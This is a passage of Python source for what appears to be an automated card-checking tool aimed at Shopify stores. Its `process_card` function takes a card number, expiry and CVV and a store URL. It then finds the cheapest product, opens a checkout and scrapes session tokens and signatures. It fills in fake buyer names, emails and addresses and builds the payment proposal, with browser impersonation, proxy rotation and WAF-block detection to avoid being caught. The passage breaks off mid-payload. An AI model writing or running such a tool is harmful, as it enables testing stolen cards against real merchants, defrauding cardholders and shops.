        lasts  = ["Smith","Johnson","Williams","Brown","Jones","Garcia",
                  "Miller","Davis","Rodriguez","Wilson"]
        return random.choice(firsts), random.choice(lasts)
    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
        return f"{first.lower()}{last.lower()}{random.randint(10,9999)}@{random.choice(domains)}"


def pick_addr(currency):
    currency = (currency or "USD").upper()
    cc = C2C.get(currency)
    if cc and cc in book and cc in SHOPIFY_PAYMENTS_COUNTRIES:
        e = random.choice(book[cc]).copy()
        e["countryCode"] = cc
        print(f"[address] 🎯 picked {cc} (currency={currency})")
        return e
    if cc == "US":
        e = _gen_us_addr()
        print(f"[address] 🎯 picked US (currency={currency})")
        return e
    for cur, c in C2C.items():
        if cur == currency and c in book and c in SHOPIFY_PAYMENTS_COUNTRIES:
            e = random.choice(book[c]).copy()
            e["countryCode"] = c
            print(f"[address] 🎯 picked {c} (currency={currency})")
            return e
    e = _gen_us_addr()
    print(f"[address] 🎯 picked US (default)")
    return e


# ═══════════════════════════════════════════════════════════════════════
# Store discovery
# ═══════════════════════════════════════════════════════════════════════
async def fetch_primary_domain(session, url, headers, proxy):
    try:
        r = await session.post(f"{url}/api/2024-01/graphql.json",
                               json={"query": "{ shop { primaryDomain { url } } }"},
                               headers=headers, proxy=proxy, timeout=8)
        if r.status_code == 200:
            pd = (r.json().get("data", {}) or {}).get("shop", {}) \
                   .get("primaryDomain", {}).get("url")
            if pd: return pd.rstrip("/")
    except Exception:
        pass
    return None

async def verify_shopify_store(session, ourl, proxy, profile):
    try:
        h = _probe_headers(profile, ourl)
        r = await session.get(f"{ourl}/meta.json", headers=h, proxy=proxy, timeout=8)
        if r.status_code == 200:
            try:
                data = r.json()
                if "shop" in data or "currency" in data:
                    return True
            except ValueError:
                pass
        r2 = await session.get(f"{ourl}/cart.js", headers=h, proxy=proxy, timeout=8)
        if r2.status_code == 200:
            try:
                data = r2.json()
                if "items" in data and "currency" in data:
                    return True
            except ValueError:
                pass
    except Exception:
        pass
    return False

async def detect_currency_via_meta(session, domain, proxy, profile):
    try:
        r = await session.get(f"{domain}/meta.json",
                              headers=_probe_headers(profile, domain),
                              proxy=proxy, timeout=5)
        if r.status_code == 200:
            c = r.json().get("currency")
            if c: return c.upper()
    except Exception: pass
    return None


async def detect_currency_via_cartjs(session, domain, proxy, profile):
    try:
        r = await session.get(f"{domain}/cart.js",
                              headers=_probe_headers(profile, domain),
                              proxy=proxy, timeout=5)
        if r.status_code == 200:
            c = r.json().get("currency")
            if c: return c.upper()
    except Exception: pass
    return None


async def detect_store_currency(session, domain, proxy, profile):
    tasks = [
        asyncio.create_task(detect_currency_via_cartjs(session, domain, proxy, profile)),
        asyncio.create_task(detect_currency_via_meta(session, domain, proxy, profile)),
    ]
    try:
        for coro in asyncio.as_completed(tasks):
            try:
                r = await coro
                if isinstance(r, str) and r:
                    for t in tasks:
                        if not t.done(): t.cancel()
                    return r
            except Exception: continue
    except Exception: pass
    return "USD"


async def probe_cart_requires_shipping(session, domain, proxy, profile):
    try:
        r = await session.get(f"{domain}/cart.js",
                              headers=_probe_headers(profile, domain),
                              proxy=proxy, timeout=5)
        if r.status_code == 200:
            j = r.json() or {}
            items = j.get("items") or []
            if items:
                return any(bool(it.get("requires_shipping", True)) for it in items)
    except Exception:
        pass
    return True


async def fetch_cheapest_candidate(session, domain, profile, proxy):
    endpoints = [
        f"{domain}/products.json",
        f"{domain}/collections/all/products.json",
    ]
    for base_url in endpoints:
        best, best_price = None, float("inf")
        for page in range(1, 3):
            try:
                r = await session.get(base_url,
                                      params={"limit": 250, "page": page},
                                      headers=_probe_headers(profile, domain),
                                      proxy=proxy, timeout=15)
            except Exception as e:
                print(f"[candidates] request error {base_url}: {str(e)[:100]}")
                break
            if r.status_code in (400, 403, 404):
                print(f"[candidates] {base_url} → {r.status_code} (trying next endpoint)")
                break
            if r.status_code != 200:
                print(f"[candidates] {base_url} HTTP {r.status_code}")
                break
            try:
                items = (r.json() or {}).get("products", [])
            except Exception:
                break
            if not items:
                break
            for prod in items:
                handle = prod.get("handle", "")
                for v in prod.get("variants", []):
                    if not v.get("available"):
                        continue
                    try:
                        price = float(v.get("price", "0"))
                    except (ValueError, TypeError):
                        continue
                    if price < MIN_PRICE or price >= best_price:
                        continue
                    best_price = price
                    best = {
                        "variant_id": str(v.get("id", "")),
                        "price": f"{price:.2f}",
                        "handle": handle,
                        "requires_shipping": v.get("requires_shipping", True),
                    }
            if best:
                print(f"[candidates] ✅ cheapest {best['variant_id']} @ {best['price']} (via {base_url})")
                return best
    return None


# ═══════════════════════════════════════════════════════════════════════
# Storefront cart
# ═══════════════════════════════════════════════════════════════════════
async def resolve_checkout_via_permalink(session, domain, numeric_vid, proxy, profile):
    """FIX #3: /cart/{vid}:1 permalink — 1 request ke andar direct checkout.
    cart/add.js + view_cart_page + POST /cart (3-4 requests) skip ho jate hain."""
    h = build_headers(profile, domain, for_document=True,
                      sec_fetch_site="same-origin", with_user=True)
    h["referer"] = f"{domain}/"
    h["accept"] = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                   "image/avif,image/webp,image/apng,*/*;q=0.8")
    try:
        r = await session.get(f"{domain}/cart/{numeric_vid}:1",
                              headers=h, proxy=proxy,
                              timeout=20, allow_redirects=True)
        if "/checkouts/" in str(r.url):
            print(f"[permalink] ✅ direct checkout: {str(r.url)[:100]}")
            return str(r.url), r.text, r
        # Permalink ne cart banaya lekin redirect nahi hua — fallback karo
        print(f"[permalink] ⚠️ no checkout redirect (url={str(r.url)[:80]})")
    except Exception as e:
        print(f"[permalink] ⚠️ {str(e)[:120]}")
    return None, None, None


async def storefront_cart_add(session, domain, numeric_variant_id, quantity,
                              referer, proxy, profile):
    h = build_headers(profile, domain, for_document=False)
    h["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
    h["accept"] = "application/json, text/javascript, */*; q=0.01"
    h["x-requested-with"] = "XMLHttpRequest"
    h["referer"] = referer or f"{domain}/"
    try:
        r = await session.post(f"{domain}/cart/add.js",
                               data={"id": str(numeric_variant_id), "quantity": str(quantity),
                                     "form_type": "product", "utf8": "✓"},
                               headers=h, proxy=proxy, timeout=15)
    except Exception as e:
        print(f"[cart] ❌ {str(e)[:150]}")
        return False, "Change Proxy"
    if r.status_code == 422:
        try:
            err = r.json() or {}
            msg = (err.get("description") or err.get("message") or "unavailable")[:80]
        except Exception:
            msg = "unavailable"
        return False, f"Cart: {msg}"
    if r.status_code != 200:
        return False, f"Cart failed: {r.status_code}"
    try:
        j = r.json() or {}
    except Exception:
        return False, "Cart failed: bad JSON"

    target_vid = str(numeric_variant_id)
    if isinstance(j, dict) and isinstance(j.get("items"), list) and j["items"]:
        item = next((it for it in j["items"] if str(it.get("variant_id")) == target_vid), j["items"][0])
    elif isinstance(j, dict) and (j.get("variant_id") or j.get("id")):
        item = j
    else:
        return False, "Cart failed: no items"

    raw_price = item.get("final_price") or item.get("price") or 0
    try:
        price_str = (f"{float(raw_price):.2f}" if isinstance(raw_price, str) and "." in raw_price
                     else f"{float(raw_price) / 100:.2f}")
    except (ValueError, TypeError):
        price_str = "0.00"

    return True, {"variant_id": str(item.get("variant_id") or numeric_variant_id),
                  "price": price_str,
                  "requires_shipping": bool(item.get("requires_shipping", True))}


async def view_cart_page(session, domain, referer, proxy, profile):
    h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
    h["referer"] = referer or f"{domain}/"
    try:
        r = await session.get(f"{domain}/cart", headers=h, proxy=proxy,
                              timeout=15, allow_redirects=True)
        if r.status_code == 200: return r.text
    except Exception: pass
    return ""


async def resolve_checkout_after_cart(session, domain, cart_html, proxy, profile):
    post_h = _checkout_headers(profile, domain, domain)
    post_h["referer"] = f"{domain}/cart"
    post_h["content-type"] = "application/x-www-form-urlencoded"

    data = {"checkout": ""}
    tok = extract_between(cart_html or "", 'name="authenticity_token" value="', '"')
    if tok: data["authenticity_token"] = tok
    try:
        r = await session.post(f"{domain}/cart", data=data, headers=post_h,
                               proxy=proxy, timeout=15, allow_redirects=False)
        loc = r.headers.get("Location") or r.headers.get("location")
        if loc:
            full = loc if loc.startswith("http") else f"{domain}{loc}"
            try:
                redir_h = build_headers(profile, domain, for_document=True,
                                        sec_fetch_site="same-origin", with_user=False)
                redir_h["referer"] = f"{domain}/cart"
                r2 = await session.get(full, headers=redir_h, proxy=proxy,
                                       timeout=20, allow_redirects=True)
                if "/checkouts/" in str(r2.url):
                    return str(r2.url), r2.text, r2
            except Exception: pass
    except Exception: pass

    try:
        direct_h = build_headers(profile, domain, for_document=True, sec_fetch_site="same-origin", with_user=True)
        direct_h["referer"] = f"{domain}/cart"
        r = await session.get(f"{domain}/checkout", headers=direct_h,
                              proxy=proxy, timeout=20, allow_redirects=True)
        if "/checkouts/" in str(r.url):
            return str(r.url), r.text, r
    except Exception: pass
    return None, None, None


# ═══════════════════════════════════════════════════════════════════════
# Persisted ID discovery
# ═══════════════════════════════════════════════════════════════════════
async def discover_persisted_ids(session, checkout_html, checkout_origin,
                                 headers, proxy, profile):
    OPS = ("Proposal", "SubmitForCompletion", "PollForReceipt")
    ids = {}
    for manifest_url in (f"https://{checkout_origin}/checkouts/internal/graphql/manifest",
                         f"https://{checkout_origin}/checkout-web/assets/manifest.json"):
        try:
            r = await session.get(manifest_url, headers=headers, proxy=proxy, timeout=8)
            if r.status_code == 200:
                for op in OPS:
                    m = re.search(rf'"{op}"\s*:\s*"([a-f0-9]{{64}})"', r.text)
                    if m: ids[op] = m.group(1)
                if len(ids) == len(OPS): return ids
        except Exception: pass

    js_urls = []
    js_urls += re.findall(r'src="(https?://[^"]+\.(?:js|mjs)[^"]*)"', checkout_html)
    for rel in re.findall(r'src="(/[^"]+\.(?:js|mjs)[^"]*)"', checkout_html):
        js_urls.append(f"https://{checkout_origin}{rel}")
    js_urls += re.findall(r'href="(https?://[^"]+\.(?:js|mjs)[^"]*)"', checkout_html)
    js_urls = list(dict.fromkeys(js_urls))[:30]
    if not js_urls: return ids

    def _patterns(op):
        return [
            rf'"{op}"\s*:\s*"([a-f0-9]{{64}})"',
            rf"'{op}'\s*:\s*'([a-f0-9]{{64}})'",
            rf'\.{op}\s*=\s*"([a-f0-9]{{64}})"',
            rf"\b{op}\s*=\s*([a-f0-9]{{64}})",
            rf'"{op}"\s*,\s*"([a-f0-9]{{64}})"',
            rf'\[\s*"{op}"\s*,\s*"([a-f0-9]{{64}})"',
        ]

    script_h = _script_headers(profile, checkout_origin)
    for url in js_urls:
        try:
            r = await session.get(url, proxy=proxy, timeout=12, headers=script_h)
            if r.status_code != 200: continue
            cl = r.headers.get("content-length")
            if cl and int(cl) > 3_000_000: continue
            text = r.text
            for op in OPS:
                if op in ids: continue
                for pat in _patterns(op):
                    m = re.search(pat, text)
                    if m: ids[op] = m.group(1); break
            if len(ids) == len(OPS): break
        except Exception: continue
    return ids


async def get_ids_for_build(build_id, session, checkout_html, checkout_origin,
                            headers, proxy, profile):
    if build_id and build_id in _ID_CACHE:
        return _ID_CACHE.get(build_id)
    ids = await discover_persisted_ids(session, checkout_html, checkout_origin,
                                       headers, proxy, profile)
    if ids and build_id:
        _ID_CACHE[build_id] = ids
    return ids


async def _raw_http_call(session, url, params, headers, json_data, proxy, retries=0):
    last_resp, last_text = None, ""
    for attempt in range(retries + 1):
        try:
            r = await session.post(url, params=params, headers=headers,
                                   json=json_data, proxy=proxy)
            text = r.text
            stripped = text.strip()
            is_5xx  = r.status_code in (502, 503, 504)
            is_html = stripped.startswith("<!DOCTYPE") or stripped.startswith("<html")

            if attempt < retries and is_5xx:
                # ── FIX #4: exponential backoff
                wait = _backoff_wait(attempt, base=0.5, cap=4.0)
                print(f"[retry] {r.status_code} — retrying in {wait:.2f}s ({attempt+1}/{retries})")
                await asyncio.sleep(wait)
                last_resp, last_text = r, text
                continue

            if is_html:
                print(f"[raw] ⚠️ HTML status={r.status_code} head={stripped[:120]!r}")
                return r, "Change Proxy"

            return r, text
        except Exception as e:
            err = str(e)
            print(f"[raw] ⚠️ network exception: {err[:150]}")
            return None, "Change Proxy"
    return last_resp, last_text


def _strip_none_vars(variables):
    if not isinstance(variables, dict): return variables
    return {k: v for k, v in variables.items() if v is not None}


async def gql(session, op_name, headers, payload, proxy,
              checkout_html=None, checkout_origin=None, build_id=None,
              profile=None):
    retries = GQL_RETRY_ATTEMPTS if op_name in ("Proposal", "PollForReceipt") else 0
    current_id = _current_id_for(op_name)
    last_resp, last_text = None, ""
    clean_vars = _strip_none_vars(payload.get("variables", {}))

    if current_id and checkout_origin:
        url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
        last_resp, last_text = await _raw_http_call(
            session, url, {"operationName": op_name}, headers,
            {**payload, "variables": clean_vars, "id": current_id},
            proxy, retries=retries)
        if not _is_persisted_stale(last_text):
            return last_resp, last_text
        print(f"[persisted] {op_name} — ID stale ({current_id[:12]}…)")

    if checkout_html and checkout_origin and profile:
        fresh_ids = await get_ids_for_build(
            build_id, session, checkout_html, checkout_origin,
            headers, proxy, profile)
        if fresh_ids.get(op_name):
            new_id = fresh_ids[op_name]
            if new_id != current_id:
                _set_persisted_id(op_name, new_id)
                url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
                last_resp, last_text = await _raw_http_call(
                    session, url, {"operationName": op_name}, headers,
                    {**payload, "variables": clean_vars, "id": new_id},
                    proxy, retries=retries)
                if not _is_persisted_stale(last_text):
                    print(f"[persisted] {op_name} — recovered ({new_id[:12]}…)")
                    return last_resp, last_text

    if _RAW_QUERIES_AVAILABLE and checkout_origin and op_name in _RAW_QUERIES:
        raw_q = _RAW_QUERIES[op_name]
        if raw_q:
            url = f"https://{checkout_origin}/checkouts/unstable/graphql"
            print(f"[raw-tier3] {op_name} — falling back to raw query")
            last_resp, last_text = await _raw_http_call(
                session, url, {"operationName": op_name}, headers,
                {"query": raw_q, "variables": clean_vars, "operationName": op_name},
                proxy, retries=retries)
            if last_text and last_text != "Change Proxy":
                return last_resp, last_text

    if not last_text:
        return last_resp, "Change Proxy"
    return last_resp, last_text


def _extract_amounts_from_seller(sp):
    out = {
        "checkout_total": None, "total": None, "running": None,
        "payment_identifier": None, "payment_stable_id": None,
        "payment_due_at": None, "payment_special": None,
        "gateway": None,
    }
    try:
        v = (sp.get("checkoutTotal") or {}).get("value", {}).get("amount")
        if v is not None: out["checkout_total"] = str(v)
        v = (sp.get("total") or {}).get("value", {}).get("amount")
        if v is not None: out["total"] = str(v)
        v = (sp.get("runningTotal") or {}).get("value", {}).get("amount")
        if v is not None: out["running"] = str(v)
    except Exception: pass
    try:
        pay = sp.get("payment") or {}
        if pay.get("__typename") == "FilledPaymentTerms":
            best = None
            for m in pay.get("availablePaymentLines", []):
                pm = m.get("paymentMethod", {})
                ident = pm.get("paymentMethodIdentifier")
                if not ident: continue
                if pm.get("checkoutHostedFields"):
                    best = pm; break
                if best is None: best = pm
            if best:
                out["payment_identifier"] = best["paymentMethodIdentifier"]
                out["gateway"] = (best.get("extensibilityDisplayName") or best.get("name"))
        pl = pay.get("paymentLines") or []
        if pl and isinstance(pl[0], dict):
            out["payment_stable_id"] = pl[0].get("stableId")
            out["payment_due_at"] = pl[0].get("dueAt")
            out["payment_special"] = pl[0].get("specialInstructions")
    except Exception: pass
    return out


# ═══════════════════════════════════════════════════════════════════════
# Main flow
# ═══════════════════════════════════════════════════════════════════════
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    currency = "USD"
    variant_price_fallback = "0.00"
    t0 = time.time()

    origin, url_variant, url_product_handle = normalize_and_extract(site_url)
    if not origin:
        return False, "Invalid site URL", gateway, variant_price_fallback, currency
    if not variant_id and url_variant:
        variant_id = url_variant
        print(f"[site] 🎯 variant_id extracted from URL: {variant_id}")

    ourl = origin
    proxy = parse_proxy(proxy_str) if proxy_str else None
    tag = f"[{cc[:6]}|{mes}|{ano}]"

    try:
        profile = random.choice(BROWSER_PROFILES)
        imp = profile["impersonate"]; ua = profile["ua"]
        print(f"{tag} profile={imp}")

        async with AsyncSession(impersonate=imp, timeout=SESSION_TIMEOUT, verify=False) as session:
            warm_headers = build_headers(profile, ourl, for_document=True)
            xhr_headers = build_headers(profile, ourl, for_document=False)
            primary = await fetch_primary_domain(session, ourl, xhr_headers, proxy)
            if primary and primary != ourl.rstrip("/"):
                print(f"{tag} 🔀 primary domain {ourl} → {primary}")
                ourl = primary
                warm_headers = build_headers(profile, ourl, for_document=True)
                xhr_headers = build_headers(profile, ourl, for_document=False)

            try:
                await session.get(ourl, headers=warm_headers, proxy=proxy,
                                  timeout=8, allow_redirects=True)
                print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
            except Exception as e:
                print(f"[warmup] ⚠️ {str(e)[:80]}")
                return False, "Change Proxy", gateway, variant_price_fallback, currency

            is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
            if not is_shopify:
                print(f"[verify] ❌ Not a Shopify store (meta.json/cart.js failed)")
                return False, "NOT_SHOPIFY", gateway, variant_price_fallback, currency
            print(f"[verify] ✅ Confirmed Shopify store")

            if variant_id:
                res = await asyncio.gather(detect_store_currency(session, ourl, proxy, profile),
                                           return_exceptions=True)
                if isinstance(res[0], str) and res[0]: currency = res[0]
                candidate = None
                numeric_vid = str(variant_id).split("/")[-1]
                variant_price_fallback = "0.00"
                print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate=provided variant={numeric_vid}")
            else:
                res = await asyncio.gather(
                    detect_store_currency(session, ourl, proxy, profile),
                    fetch_cheapest_candidate(session, ourl, profile, proxy),
                    return_exceptions=True)
                if isinstance(res[0], str) and res[0]: currency = res[0]
                candidate = res[1] if not isinstance(res[1], Exception) else None
                print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate={'yes' if candidate else 'no'}")
                if not candidate:
                    return False, "<b>No Purchasable Products!</b>", gateway, "0.00", currency
                numeric_vid = candidate["variant_id"]
                variant_price_fallback = candidate["price"]
                print(f"[candidate] cheapest variant={numeric_vid} price={candidate['price']}")

            product_handle = candidate.get("handle", "") if candidate else (url_product_handle or "")
            add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"

            # ── FIX #3: permalink first (1 request), cart fallback (3-4 requests)
            checkout_url, text, response = await resolve_checkout_via_permalink(
                session, ourl, numeric_vid, proxy, profile)

            cart_requires_shipping = True  # will be corrected by P1 response
            if not checkout_url or not text or len(text) < 5000:
                print(f"[cart] permalink failed or short HTML — falling back to cart/add.js flow")
                ok, payload = await storefront_cart_add(
                    session, ourl, numeric_vid, 1, add_referer, proxy, profile)
                if not ok:
                    return False, payload, gateway, variant_price_fallback, currency
                variant_id = payload["variant_id"]
                variant_price_fallback = payload["price"]
                cart_requires_shipping = payload.get("requires_shipping", True)
                print(f"[cart] ✅ {time.time()-t0:.2f}s variant={variant_id} "
                      f"price={variant_price_fallback} ship_req={cart_requires_shipping}")

                cart_html = await view_cart_page(session, ourl, add_referer, proxy, profile)
                checkout_url, text, response = await resolve_checkout_after_cart(
                    session, ourl, cart_html, proxy, profile)
            else:
                variant_id = str(numeric_vid)
                print(f"[cart] ✅ {time.time()-t0:.2f}s (permalink path) variant={variant_id}")

            if not checkout_url or not response:
                if is_waf_block(text or ""):
                    return False, "Change Proxy", gateway, variant_price_fallback, currency
                return False, "Failed to get checkout URL", gateway, variant_price_fallback, currency

            checkout_origin = urlparse(checkout_url).netloc
            if checkout_origin != urlparse(ourl).netloc:
                print(f"[checkout] ↪️ domain shift {urlparse(ourl).netloc} → {checkout_origin}")

            await asyncio.sleep(random.uniform(0.3, 0.6))

            atm = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            source_id = atm.group(1) if atm else str(uuid.uuid4()).replace("-", "").upper()
            attempt_token = _gen_attempt_token(source_id)
            page_id = _gen_page_id()
            gql_referer = _payment_referer(checkout_url, source_id)
            print(f"[checkout] referer={gql_referer[:120]}")

            sst = (response.headers.get("X-Checkout-One-Session-Token")
                   or response.headers.get("x-checkout-one-session-token"))
            if not sst:
                for pat, ep in (
                    ("name=serialized-sessionToken content='\"", "\"'"),
                    ('name="serialized-sessionToken" content=\'\"', '\"\''),
                    ('name="serialized-sessionToken" content="&quot;', "&quot;"),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('"sessionToken":"', '"'),
                ):
                    sst = extract_between(text, pat, ep)
                    if sst:
                        sst = sst.replace("&quot;", "").strip('"').strip("'")
                        break
            session_identifier = None
            for pat, ep in (
                ("name=serialized-checkoutSessionIdentifier content='\"", "\"'"),
                ('name="serialized-checkoutSessionIdentifier" content=\'\"', '\"\''),
                ('name="serialized-checkoutSessionIdentifier" content="', '"'),
                ('name="serialized-checkoutSessionIdentifier" content="&quot;', '&quot;'),
            ):
                session_identifier = extract_between(text, pat, ep)
                if session_identifier:
                    session_identifier = session_identifier.replace("&quot;", "").strip('"').strip("'")
                    break
            if session_identifier:
                print(f"[checkout] ✅ session_identifier={session_identifier[:15]}...")

            source_token = None
            for pat, ep in (
                ("name=serialized-sourceToken content='\"", "\"'"),
                ('name="serialized-sourceToken" content=\'\"', '\"\''),
                ('name="serialized-sourceToken" content="', '"'),
                ('name="serialized-sourceToken" content="&quot;', '&quot;'),
            ):
                source_token = extract_between(text, pat, ep)
                if source_token:
                    source_token = source_token.replace("&quot;", "").strip('"').strip("'")
                    break

            source_type = None
            for pat, ep in (
                ("name=serialized-sourceType content='\"", "\"'"),
                ('name="serialized-sourceType" content=\'\"', '\"\''),
                ('name="serialized-sourceType" content="', '"'),
                ('name="serialized-sourceType" content="&quot;', '&quot;'),
            ):
                source_type = extract_between(text, pat, ep)
                if source_type:
                    source_type = source_type.replace("&quot;", "").strip('"').strip("'")
                    break
            if not source_type:
                source_type = "cn"

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, variant_price_fallback, currency
            if not sst:
                if is_waf_block(text):
                    return False, "Change Proxy", gateway, variant_price_fallback, currency
                return False, "Failed to get SST", gateway, variant_price_fallback, currency

            unesc = text.replace("&quot;", '"').replace("&amp;", "&").replace("&#39;", "'")

            queueToken = (extract_between(text, "queueToken&quot;:&quot;", "&quot;")
                          or extract_between(text, '"queueToken":"', '"'))

            stableId = None
            for sg_pat in (
                r'name="serialized-graphql" content="([^"]+)"',
                r"name=serialized-graphql content='([^']+)'",
                r'name=serialized-graphql content="([^"]+)"',
            ):
                m = re.search(sg_pat, text)
                if m:
                    try:
                        sg = m.group(1).replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
                        mj = re.search(r'"merchandiseLines"\s*:\s*\[\s*\{[^{}]*"stableId"\s*:\s*"([^"]+)"', sg)
                        if mj: stableId = mj.group(1)
                        if not stableId:
                            mj = re.search(r'"stableId"\s*:\s*"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"', sg)
                            if mj: stableId = mj.group(1)
                    except Exception:
                        pass
                    if stableId:
                        break
            if not stableId:
                m = re.search(r'"buyerProposal"[^{}]*"merchandiseLines"\s*:\s*\[\s*\{[^{}]*"stableId"\s*:\s*"([^"]+)"', unesc)
                if m: stableId = m.group(1)
            if not stableId:
                m = re.search(r'"merchandiseLines"\s*:\s*\[\s*\{[^{}]*"stableId"\s*:\s*"([^"]+)"', unesc)
                if m: stableId = m.group(1)
            if not stableId:
                m = re.search(r'"stableId"\s*:\s*"([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})"', unesc)
                if m: stableId = m.group(1)

            if stableId:
                print(f"[checkout] ✅ stableId={stableId}")
            else:
                stableId = str(uuid.uuid4())
                print(f"[checkout] ⚠️ stableId not found, generated={stableId}")

            merch = (extract_between(text, "ProductVariantMerchandise/", "&quot;")
                     or extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                     or str(variant_id))

            m = re.search(r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"', unesc)
            if m:
                html_currency = m.group(1)
                if html_currency != currency:
                    print(f"[currency] 🔧 {currency} → {html_currency} (from checkout HTML)")
                    currency = html_currency
            else:
                m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', unesc)
                if m:
                    html_currency = m.group(1)
                    if html_currency != currency:
                        print(f"[currency] 🔧 {currency} → {html_currency} (from checkout HTML)")
                        currency = html_currency

            addr = pick_addr(currency)
            country_code = addr["countryCode"]

            firstName, lastName = Utils.get_random_name()
            email = Utils.generate_email(firstName, lastName)
            phone = addr["phone"]; street = addr["address1"]
            city = addr["city"]; state = addr["zoneCode"]; s_zip = addr["postalCode"]
            address2 = ""
            billing_street = _billing_street_dict(street, address2, city, country_code,
                                                  s_zip, firstName, lastName, state, phone)

            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
            if bm: build_id = bm.group(1)

            pci_build = PCI_BUILD_ID
            bm_pci = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]{7,8})/', unesc)
            if bm_pci: pci_build = bm_pci.group(1)

            transformer_fp_v2 = None
            tfp = re.search(r'"transformerFingerprintV2"\s*:\s*"([^"]+)"', unesc)
            if not tfp:
                tfp = re.search(r'transformerFingerprintV2&quot;:&quot;([^&]+)&quot;', text)
            if tfp: transformer_fp_v2 = tfp.group(1)

            ident_sig = None
            for sp in (
                r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
                r'"identificationSignature"\s*:\s*"([^"]+)"',
                r'"callerIdentificationSignature"\s*:\s*"([^"]+)"',
                r'"identification_signature"\s*:\s*"([^"]+)"',
                r'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;([^&]+)&quot;',
                r'identificationSignature&quot;:&quot;([^&]+)&quot;',
            ):
                im = re.search(sp, unesc) or re.search(sp, text)
                if im:
                    ident_sig = im.group(1).replace("&quot;", "").strip('"').strip("'")
                    break

            script_sig = None; script_sig_uuid = None
            mm = re.search(r'"signature"\s*:\s*"([^"]+)"', unesc) or \
                 re.search(r'signature&quot;:&quot;([^&]+)&quot;', text)
            if mm: script_sig = mm.group(1).replace("&quot;", "").strip('"')
            mm = re.search(r'"signatureUuid"\s*:\s*"([^"]+)"', unesc) or \
                 re.search(r'signatureUuid&quot;:&quot;([^&]+)&quot;', text)
            if mm: script_sig_uuid = mm.group(1).replace("&quot;", "").strip('"')

            payment_scope = checkout_origin
            for sp in (r'"paymentSessionScope":"([^"]+)"',
                       r'paymentSessionScope&quot;:&quot;([^&]+)&quot;',
                       r'"payment_session_scope":"([^"]+)"'):
                m = re.search(sp, unesc) or re.search(sp, text)
                if m: payment_scope = m.group(1); break

            print(f"[checkout] ✅ {time.time()-t0:.2f}s build_id={'OK' if build_id else 'MISS'} "
                  f"pci_build={pci_build} tfp={'OK' if transformer_fp_v2 else 'MISS'} "
                  f"sig={'OK' if script_sig else 'MISS'} ident={'OK' if ident_sig else 'MISS'}")

            headers = _gql_headers(profile, checkout_origin, source_id, sst,
                                   gql_referer, build_id=build_id, ident_sig=ident_sig,
                                   session_identifier=session_identifier,
                                   source_token=source_token, source_type=source_type)

            fresh_ids = await get_ids_for_build(
                build_id, session, text, checkout_origin,
                headers, proxy, profile)
            if fresh_ids:
                for op in ("Proposal", "SubmitForCompletion", "PollForReceipt"):
                    if fresh_ids.get(op):
                        _set_persisted_id(op, fresh_ids[op])
                        print(f"[persisted] fresh {op} ({fresh_ids[op][:12]}…)")
            else:
                print(f"[persisted] no fresh IDs; using hardcoded")

            negotiated_stable_id = stableId or ""
            delivery_strategy = ""
            no_delivery_mode = not cart_requires_shipping
            checkpoint_data = None

            initial_delivery = {
                "deliveryLines": [{
                    "destination": {"partialStreetAddress": {
                        "address1": street, "address2": address2, "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName, "zoneCode": state, "phone": phone}},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": True,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            }

            proposal_variables = {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queueToken or "",
                "changesetTokens": [],
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": initial_delivery,
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {"merchandiseLines": [{
                    "stableId": stableId,
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponentsSource": None, "lineComponents": []}]},
                "payment": {
                    "totalAmount": {"any": True}, "paymentLines": [],
                    "billingAddress": {"streetAddress": dict(billing_street)},
                    "creditCardBin": _cc_bin(cc),
                    "allowStoreCredit": False,
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                    "email": email, "emailChanged": False,
                    "phoneCountryCode": country_code,
                    "phone": phone,
                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
                    "messagingMarketingConsent": {
